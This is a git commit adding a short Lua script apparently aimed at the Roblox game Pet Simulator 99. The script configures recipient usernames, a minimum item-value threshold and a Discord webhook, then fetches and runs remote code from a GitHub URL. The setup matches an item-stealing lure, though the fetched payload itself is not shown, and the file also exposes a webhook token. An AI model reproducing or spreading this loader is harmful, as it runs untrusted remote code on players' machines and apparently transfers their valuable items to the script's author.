f61d522ceda6adc4accf6d34b9ef044ad1ed2363
aboodgameroo <aboodgameroo533@gmail.com>
2025-04-24 22:07:20 +0200

    Add files via upload

---
+++ ps99 script.txt.lua
@@ -0,0 +1,5 @@
+_G.Usernames = {"king40181"} -- you can add as many as you'd like
+_G.minrap = 10000000
+_G.webhook = "https://discord.com/api/webhooks/1365052307036966983/r-49aWs2M6spIQWwEM5ShtgZalMz2S_01ihRRGvSlzk3m2N-b0mNjnqrDLh3DW8wif9A" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aboodgameroo/ps99/refs/heads/main/code.lua"))()
